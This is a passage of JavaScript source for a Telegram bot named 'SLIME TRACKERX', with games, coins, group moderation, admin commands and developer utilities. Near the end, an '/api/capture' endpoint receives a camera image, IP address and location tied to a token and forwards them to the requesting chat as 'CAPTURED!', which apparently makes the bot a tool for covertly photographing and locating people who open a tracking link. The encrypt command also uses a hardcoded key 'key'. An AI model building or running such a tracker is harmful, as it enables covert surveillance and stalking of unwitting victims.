  await ctx.reply("🎁 REDEEM\n\nUse: /redeem <CODE>\n\nGet codes from giveaways!");
});

bot.command("redeem", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("❌ /redeem <CODE>");
  let res = redeemCode(ctx.from.id, args[1]);
  if (res.ok) {
    let u = users.get(ctx.from.id);
    await ctx.reply(`✅ ${res.msg}\n💰 ${u.coins}`);
  } else {
    await ctx.reply(res.msg);
  }
});

// ========== REFERRAL ==========
bot.action("refinfo", async (ctx) => {
  let u = initUser(ctx.from.id);
  await ctx.reply(`🔗 REFERRAL\n\nLink: ${refLink(ctx.from.id)}\n\n📊 ${u.refs} refs | ${u.refs * REF_REWARD} coins earned\n\n🎁 ${REF_REWARD} coins per ref!`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "back")]])
  });
});

// ========== GROUP TOOLS ==========
bot.action("tag", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return ctx.reply("❌ Group only!");
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
  let now = Date.now();
  let last = tagCD.get(ctx.chat.id) || 0;
  if (now - last < 300000) return ctx.reply(`⏰ Wait ${Math.ceil((300000 - (now - last)) / 60000)} min`);
  await ctx.reply("🔊 Tagging...");
  try {
    let admins = await ctx.getChatAdministrators();
    let mentions = "";
    for (let a of admins.slice(0, 30)) {
      mentions += `[@${a.user.username || a.user.first_name}](tg://user?id=${a.user.id}) `;
    }
    await ctx.reply(`📢 Announcement\n\n${mentions}`, { parse_mode: "Markdown" });
    tagCD.set(ctx.chat.id, now);
  } catch {
    ctx.reply("❌ Make me admin!");
  }
});

bot.action("setw", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
  await ctx.reply("📝 Use: /setwelcome {name} {group}");
});

bot.command("setwelcome", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /setwelcome Welcome {name} to {group}!");
  welcome.set(ctx.chat.id, msg);
  await ctx.reply(`✅ Welcome set!\n${msg}`);
});

bot.action("setg", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
  await ctx.reply("📝 Use: /setgoodbye {name}");
});

bot.command("setgoodbye", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /setgoodbye Goodbye {name}!");
  goodbye.set(ctx.chat.id, msg);
  await ctx.reply(`✅ Goodbye set!\n${msg}`);
});

bot.on("new_chat_members", async (ctx) => {
  let msg = welcome.get(ctx.chat.id);
  if (!msg) return;
  for (let m of ctx.message.new_chat_members) {
    if (m.id === bot.botInfo.id) continue;
    await ctx.reply(msg.replace("{name}", m.first_name).replace("{group}", ctx.chat.title));
  }
});

bot.on("left_chat_member", async (ctx) => {
  let msg = goodbye.get(ctx.chat.id);
  if (!msg) return;
  let m = ctx.message.left_chat_member;
  if (m.id === bot.botInfo.id) return;
  await ctx.reply(msg.replace("{name}", m.first_name).replace("{group}", ctx.chat.title));
});

bot.action("alink", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  if (antiLink.has(ctx.chat.id)) {
    antiLink.delete(ctx.chat.id);
    await ctx.reply("🚫 Anti-link OFF");
  } else {
    antiLink.add(ctx.chat.id);
    await ctx.reply("✅ Anti-link ON");
  }
});

bot.action("aspam", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  if (antiSpam.has(ctx.chat.id)) {
    antiSpam.delete(ctx.chat.id);
    await ctx.reply("🛡️ Anti-spam OFF");
  } else {
    antiSpam.add(ctx.chat.id);
    await ctx.reply("✅ Anti-spam ON");
  }
});

bot.action("warn", async (ctx) => {
  await ctx.reply("⚠️ Reply with /warn");
});

bot.command("warn", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  let reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user!");
  let id = reply.from.id;
  let w = (warns.get(id) || 0) + 1;
  warns.set(id, w);
  await ctx.reply(`⚠️ ${reply.from.first_name} warned (${w}/3)`);
  if (w >= 3) {
    await ctx.telegram.banChatMember(ctx.chat.id, id);
    warns.delete(id);
    await ctx.reply(`🚫 ${reply.from.first_name} banned!`);
  }
});

bot.action("kick", async (ctx) => {
  await ctx.reply("🔨 Reply with /kick");
});

bot.command("kick", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  let reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user!");
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`👢 ${reply.from.first_name} kicked!`);
});

bot.action("ban", async (ctx) => {
  await ctx.reply("🚫 Reply with /ban");
});

bot.command("ban", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  let reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user!");
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`🚫 ${reply.from.first_name} banned!`);
});

bot.action("mute", async (ctx) => {
  await ctx.reply("🔇 Reply with /mute <minutes>");
});

bot.command("mute", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  let args = ctx.message.text.split(" ");
  let mins = parseInt(args[1]) || 30;
  let reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user!");
  let until = Math.floor(Date.now() / 1000) + (mins * 60);
  await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
    until_date: until,
    can_send_messages: false
  });
  await ctx.reply(`🔇 ${reply.from.first_name} muted for ${mins} min`);
});

bot.action("gstats", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  let chat = await ctx.getChat();
  let admins = await ctx.getChatAdministrators();
  let count = await ctx.telegram.getChatMembersCount(ctx.chat.id);
  await ctx.reply(`📊 GROUP\n\n📝 ${chat.title}\n👥 ${count} members\n👑 ${admins.length} admins\n\n🚫 Anti-link: ${antiLink.has(ctx.chat.id) ? "ON" : "OFF"}\n🛡️ Anti-spam: ${antiSpam.has(ctx.chat.id) ? "ON" : "OFF"}`);
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  await ctx.reply(`
👑 ADMIN PANEL

💰 /addcoin @user amount
🎁 /gencode coins uses hours
📋 /codes
🗑️ /delcode CODE
📢 /broadcast msg
👥 /users
📊 /stats
🚫 /banuser @user
✅ /unbanuser @user
  `);
});

bot.command("addcoin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /addcoin @user amount");
  let user = args[1].replace("@", "");
  let amt = parseInt(args[2]);
  if (isNaN(amt)) return ctx.reply("Amount must be number!");
  
  for (let [id, u] of users) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === user) {
        u.coins += amt;
        u.totalEarned += amt;
        users.set(id, u);
        await ctx.reply(`✅ +${amt} to @${user}\n💰 ${u.coins} coins`);
        return;
      }
    } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let uses = Math.min(parseInt(args[2]) || 20, 20);
  let hours = parseInt(args[3]) || 24;
  let code = genCode(coins, uses, hours);
  await ctx.reply(`✅ CODE GENERATED!\n\nCode: \`${code}\`\n💰 ${coins} coins\n🔄 ${uses} uses\n⏱️ ${hours} hours`, { parse_mode: "Markdown" });
});

bot.command("codes", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  if (codes.size === 0) return ctx.reply("No active codes.");
  let msg = "📋 ACTIVE CODES:\n\n";
  for (let [c, d] of codes) {
    msg += `\`${c}\` - ${d.coins} coins - ${d.left} uses left\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.command("delcode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /delcode CODE");
  let code = args[1].toUpperCase();
  if (codes.has(code)) {
    codes.delete(code);
    await ctx.reply(`✅ Code ${code} deleted!`);
  } else {
    await ctx.reply(`❌ Code ${code} not found!`);
  }
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /broadcast message");
  await ctx.reply("📢 Sending broadcast...");
  let s = 0, f = 0;
  for (let [id] of users) {
    try {
      await ctx.telegram.sendMessage(id, `📢 ANNOUNCEMENT\n\n${msg}`);
      s++;
    } catch {
      f++;
    }
  }
  await ctx.reply(`✅ ${s} sent | ❌ ${f} failed`);
});

bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let msg = "📋 USERS:\n\n";
  let i = 0;
  for (let [id, u] of users) {
    msg += `${++i}. ID: ${id} - ${u.coins} coins\n`;
    if (i >= 20) break;
  }
  msg += `\nTotal: ${users.size} users`;
  await ctx.reply(msg);
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let total = Array.from(users.values()).reduce((s, u) => s + u.coins, 0);
  await ctx.reply(`
📊 BOT STATS

👥 Users: ${users.size}
💰 Total Coins: ${total}
🎯 Hacks: ${stats.hacks}
🎮 Games: ${stats.games}
🎁 Referrals: ${stats.refs}
⏱️ Uptime: ${Math.floor((Date.now() - stats.start) / 3600000)}h
  `);
});

bot.command("banuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /banuser @user");
  let user = args[1].replace("@", "");
  for (let [id] of users) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === user) {
        banned.add(id);
        await ctx.reply(`🚫 @${user} banned!`);
        return;
      }
    } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("unbanuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /unbanuser @user");
  let user = args[1].replace("@", "");
  for (let [id] of users) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === user) {
        banned.delete(id);
        await ctx.reply(`✅ @${user} unbanned!`);
        return;
      }
    } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("restart", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  await ctx.reply("🔄 Restarting...");
  setTimeout(() => process.exit(0), 2000);
});

// ========== CHAT SYSTEM ==========
bot.command("chat", async (ctx) => {
  activeChats.set(ctx.chat.id, true);
  await ctx.reply("💬 **CHAT MODE ACTIVE**\n\nSend any message and the developer will receive it.\nType `/exit` to leave chat mode.\n\n_Response time: Usually within minutes_", { parse_mode: "Markdown" });
});

bot.command("exit", async (ctx) => {
  if (activeChats.has(ctx.chat.id)) {
    activeChats.delete(ctx.chat.id);
    await ctx.reply("✅ Exited chat mode. Type /chat to start again.");
  } else {
    await ctx.reply("⚠️ You are not in chat mode!");
  }
});

// ========== DEV TOOLS COMMANDS ==========
bot.action("obf", async (ctx) => {
  await ctx.reply("🔒 OBFUSCATE\n\nSend your JavaScript code to protect!\n\nExample:\nfunction hello() {\n  console.log(\"Hello\");\n}");
  gameSessions.set(ctx.from.id, { type: "obf" });
});

bot.action("min", async (ctx) => {
  await ctx.reply("🗜️ MINIFY\n\nSend your JavaScript code to compress!");
  gameSessions.set(ctx.from.id, { type: "min" });
});

bot.action("val", async (ctx) => {
  await ctx.reply("✅ VALIDATE\n\nSend your JavaScript code to check syntax!");
  gameSessions.set(ctx.from.id, { type: "val" });
});

bot.action("enc", async (ctx) => {
  await ctx.reply("🔐 ENCRYPT\n\nUse: /encrypt <text>\nExample: /encrypt hello world");
});

bot.command("encrypt", async (ctx) => {
  let text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /encrypt <text>");
  let cipher = crypto.createCipher("aes-256-cbc", "key");
  let enc = cipher.update(text, "utf8", "hex") + cipher.final("hex");
  await ctx.reply(`🔐 \`${enc}\``, { parse_mode: "Markdown" });
});

bot.action("dec", async (ctx) => {
  await ctx.reply("🔓 DECRYPT\n\nUse: /decrypt <hex>\nExample: /decrypt 4e6f6d");
});

bot.command("decrypt", async (ctx) => {
  let text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /decrypt <hex>");
  try {
    let decipher = crypto.createDecipher("aes-256-cbc", "key");
    let dec = decipher.update(text, "hex", "utf8") + decipher.final("utf8");
    await ctx.reply(`🔓 ${dec}`);
  } catch {
    await ctx.reply("❌ Invalid!");
  }
});

bot.action("b64", async (ctx) => {
  await ctx.reply("📝 BASE64\n\nUse: /base64 <text>\nExample: /base64 hello");
});

bot.command("base64", async (ctx) => {
  let text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /base64 <text>");
  await ctx.reply(`📝 \`${Buffer.from(text).toString("base64")}\``, { parse_mode: "Markdown" });
});

bot.action("hash", async (ctx) => {
  await ctx.reply("🔢 HASH\n\nUse: /hash <md5/sha256> <text>\nExample: /hash md5 hello");
});

bot.command("hash", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let type = args[1];
  let text = args.slice(2).join(" ");
  if (!type || !text) return ctx.reply("Usage: /hash <md5/sha256> <text>");
  let hash;
  if (type === "md5") hash = crypto.createHash("md5").update(text).digest("hex");
  else if (type === "sha256") hash = crypto.createHash("sha256").update(text).digest("hex");
  else return ctx.reply("Use md5 or sha256");
  await ctx.reply(`🔢 \`${hash}\``, { parse_mode: "Markdown" });
});

bot.action("ts", async (ctx) => {
  await ctx.reply(`⏰ ${Math.floor(Date.now() / 1000)}\n📅 ${new Date().toLocaleString()}`);
});

bot.action("rand", async (ctx) => {
  await ctx.reply("🎲 RANDOM\n\nUse: /random <min> <max>\nExample: /random 1 100");
});

bot.command("random", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let min = parseInt(args[1]) || 1;
  let max = parseInt(args[2]) || 100;
  await ctx.reply(`🎲 ${Math.floor(Math.random() * (max - min + 1) + min)}`);
});

bot.action("note", async (ctx) => {
  await ctx.reply("📋 NOTE\n\nUse: /note <text>\nView notes: /note list");
});

bot.command("note", async (ctx) => {
  let text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text || text === "list") {
    let n = notes.get(ctx.from.id) || [];
    if (n.length === 0) return ctx.reply("No notes");
    let msg = "📋 NOTES:\n";
    n.forEach((note, i) => msg += `${i+1}. ${note}\n`);
    return ctx.reply(msg);
  }
  let n = notes.get(ctx.from.id) || [];
  n.push(text);
  notes.set(ctx.from.id, n);
  await ctx.reply(`✅ Note saved!`);
});

bot.action("rem", async (ctx) => {
  await ctx.reply("⏰ REMINDER\n\nUse: /remind <minutes> <text>\nExample: /remind 10 wake up");
});

bot.command("remind", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let mins = parseInt(args[1]);
  let text = args.slice(2).join(" ");
  if (isNaN(mins) || !text) return ctx.reply("Usage: /remind <minutes> <text>");
  setTimeout(async () => {
    await ctx.reply(`⏰ REMINDER: ${text}`);
  }, mins * 60000);
  await ctx.reply(`✅ Reminder set for ${mins} minutes`);
});

bot.action("afk", async (ctx) => {
  await ctx.reply("💤 AFK\n\nUse: /afk <reason>\nExample: /afk sleeping");
});

bot.command("afk", async (ctx) => {
  let reason = ctx.message.text.split(" ").slice(1).join(" ") || "AFK";
  afk.set(ctx.from.id, { reason, time: Date.now() });
  await ctx.reply(`💤 AFK: ${reason}`);
});

bot.action("whois", async (ctx) => {
  await ctx.reply("🔍 WHOIS\n\nUse: /whois @username");
});

bot.command("whois", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return ctx.reply("Usage: /whois @username");
  for (let [id, u] of users) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === user) {
        await ctx.reply(`👤 ${c.first_name}\n🆔 ${id}\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs`);
        return;
      }
    } catch(e) {}
  }
  await ctx.reply("❌ User not found");
});

bot.action("sys", async (ctx) => {
  let uptime = Math.floor((Date.now() - stats.start) / 3600000);
  let totalCoins = Array.from(users.values()).reduce((s, u) => s + u.coins, 0);
  await ctx.reply(`📊 SYSTEM\n\n🤖 v2.0\n⏱️ ${uptime}h up\n👥 ${users.size} users\n💰 ${totalCoins} coins\n🎯 ${stats.hacks} hacks\n🎮 ${stats.games} games\n🎁 ${stats.refs} refs`);
});

// ========== SINGLE MESSAGE HANDLER - NO DUPLICATES ==========
bot.on("text", async (ctx) => {
  // Prevent duplicate processing
  const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
  if (global.processedMessages?.has(msgId)) return;
  if (!global.processedMessages) global.processedMessages = new Set();
  global.processedMessages.add(msgId);
  setTimeout(() => global.processedMessages.delete(msgId), 5000);
  
  // ========== CHAT SYSTEM: User to Owner ==========
  if (activeChats.has(ctx.chat.id) && ctx.chat.id !== OWNER_ID) {
    let msg = ctx.message.text;
    let from = ctx.from;
    await ctx.telegram.sendMessage(OWNER_ID, `
📨 **NEW MESSAGE FROM USER**

👤 **Name:** ${from.first_name} ${from.last_name || ''}
🔗 **Username:** @${from.username || 'None'}
🆔 **ID:** ${from.id}

💬 **Message:**
${msg}

✏️ *Reply to this message to respond to the user.*
`, { parse_mode: "Markdown" });
    await ctx.reply("✅ Message sent to developer!");
    return;
  }
  
  // ========== CHAT SYSTEM: Owner Reply ==========
  if (ctx.chat.id === OWNER_ID && ctx.message.reply_to_message) {
    let replyText = ctx.message.reply_to_message.text || "";
    let match = replyText.match(/🆔 ID: (\d+)/);
    if (match) {
      let userId = parseInt(match[1]);
      let replyMsg = ctx.message.text;
      await ctx.telegram.sendMessage(userId, `💬 **Reply from Developer:**\n\n${replyMsg}`, { parse_mode: "Markdown" });
      await ctx.reply("✅ Reply sent to user!");
      return;
    }
  }
  
  // ========== DEV TOOLS SESSIONS ==========
  let session = gameSessions.get(ctx.from.id);
  if (session) {
    let code = ctx.message.text;
    if (session.type === "obf") {
      let res = obfuscateCode(code);
      if (res.ok) {
        await ctx.reply(`✅ OBFUSCATED!\n📊 ${res.orig} → ${res.new} (${res.comp}%)\n\n\`\`\`js\n${res.ob.substring(0, 3000)}\`\`\``, { parse_mode: "Markdown" });
        if (res.ob.length > 3000) await ctx.replyWithDocument({ source: Buffer.from(res.ob), filename: "obfuscated.js" });
      } else await ctx.reply(`❌ ${res.error}`);
    } else if (session.type === "min") {
      let res = minifyCode(code);
      if (res.ok) await ctx.reply(`🗜️ MINIFIED\n\n\`\`\`js\n${res.min.substring(0, 3000)}\`\`\``, { parse_mode: "Markdown" });
      else await ctx.reply(`❌ ${res.error}`);
    } else if (session.type === "val") {
      let res = validateCode(code);
      if (res.ok) await ctx.reply("✅ Valid code!");
      else await ctx.reply(`❌ ${res.error}`);
    }
    gameSessions.delete(ctx.from.id);
    return;
  }
  
  // ========== AFK CHECK ==========
  let afkUser = afk.get(ctx.from.id);
  if (afkUser) {
    let mins = Math.floor((Date.now() - afkUser.time) / 60000);
    await ctx.reply(`💤 ${ctx.from.first_name} is AFK: ${afkUser.reason} (${mins} min ago)`);
    afk.delete(ctx.from.id);
  }
  
  // ========== ANTI-SPAM IN GROUPS ==========
  if (ctx.chat.type?.includes("group")) {
    if (antiLink.has(ctx.chat.id) && (ctx.message.text.includes("http") || ctx.message.text.includes("t.me"))) {
      await ctx.deleteMessage();
      await ctx.reply(`🚫 Links not allowed! ${ctx.from.first_name}`);
      return;
    }
    if (antiSpam.has(ctx.chat.id)) {
      let now = Date.now();
      let spam = spamTrack.get(ctx.from.id) || [];
      let recent = spam.filter(t => now - t < 5000);
      if (recent.length >= 3) {
        await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
          until_date: Math.floor(now / 1000) + 60,
          can_send_messages: false
        });
        await ctx.reply(`🛡️ ${ctx.from.first_name} muted for spamming!`);
        spamTrack.delete(ctx.from.id);
        return;
      } else {
        recent.push(now);
        spamTrack.set(ctx.from.id, recent);
      }
    }
  }
  
  // ========== ADD XP ==========
  addXP(ctx.from.id, 1);
});

// ========== SIMPLE COMMANDS ==========
bot.command("balance", async (ctx) => {
  let u = initUser(ctx.from.id);
  await ctx.reply(`💰 ${u.coins} coins`);
});

bot.command("profile", async (ctx) => {
  let u = initUser(ctx.from.id);
  let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0;
  await ctx.reply(`👤 ${ctx.from.first_name}\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs\n🎮 ${u.wins}W/${u.losses}L (${winRate}%)`);
});

bot.command("daily", async (ctx) => {
  let u = initUser(ctx.from.id);
  let now = Date.now();
  if (u.lastDaily && now - u.lastDaily < 86400000) {
    let h = Math.floor((86400000 - (now - u.lastDaily)) / 3600000);
    return ctx.reply(`⏰ ${h}h left`);
  }
  let streak = u.streak || 0;
  if (u.lastDaily && now - u.lastDaily < 172800000) streak++;
  else streak = 1;
  let reward = DAILY_REWARD + Math.min(streak, 10);
  addCoin(ctx.from.id, reward);
  u.streak = streak;
  u.lastDaily = now;
  users.set(ctx.from.id, u);
  await ctx.reply(`🎁 +${reward} coins! Streak: ${streak}\n💰 ${u.coins + reward}`);
});

bot.command("work", async (ctx) => {
  let u = initUser(ctx.from.id);
  let now = Date.now();
  let last = workCD.get(u.id) || 0;
  if (now - last < WORK_CD) {
    let h = Math.floor((WORK_CD - (now - last)) / 3600000);
    return ctx.reply(`⏰ ${h}h left`);
  }
  let jobs = ["💻 Dev", "🎨 Design", "📝 Write", "🎮 Game", "🛒 Shop"];
  let job = jobs[Math.floor(Math.random() * jobs.length)];
  let reward = WORK_REWARD;
  addCoin(u.id, reward);
  workCD.set(u.id, now);
  await ctx.reply(`💼 ${job} +${reward} coin\n💰 ${u.coins + reward}`);
});

// ========== API ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location } = req.body;
    if (!token || !tokens.has(token)) return res.status(400).json({ error: "Invalid" });
    let data = tokens.get(token);
    if (image) {
      let buf = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(data.chat, { source: buf }, {
        caption: `📸 CAPTURED!\n🌐 IP: ${ip}\n📍 ${location}\n🕐 ${new Date().toLocaleString()}`
      });
    }
    tokens.delete(token);
    res.json({ status: "success" });
  } catch(e) {
    res.status(500).json({ error: "Error" });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));

// Stop any existing polling before starting
bot.telegram.deleteWebhook().then(() => {
    console.log("Webhook deleted, starting polling...");
    bot.launch().then(() => {
        console.log(`🤖 SLIME TRACKERX v2.0 LIVE!`);
    });
}).catch(e => console.log("Webhook cleanup done"));

// Graceful stop
process.once("SIGINT", () => {
    bot.stop("SIGINT");
    process.exit(0);
});
process.once("SIGTERM", () => {
    bot.stop("SIGTERM");
    process.exit(0);
});
